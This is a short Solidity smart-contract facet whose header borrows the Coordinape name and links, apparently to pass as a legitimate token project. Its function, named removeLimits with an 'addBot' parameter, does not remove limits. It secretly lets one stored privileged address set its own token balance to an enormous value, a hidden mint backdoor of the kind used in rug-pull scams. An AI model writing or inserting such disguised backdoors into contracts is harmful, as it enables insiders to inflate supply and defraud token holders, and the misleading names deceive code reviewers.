/*
 * SPDX-License-Identifier: MIT
 * Website: https://coordinape.com/?utm_source=icodrops
 * Twitter: https://twitter.com/coordinape
 * Discord: https://discord.gg/DPjmDWEUH5
 */
pragma solidity ^0.8.21;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
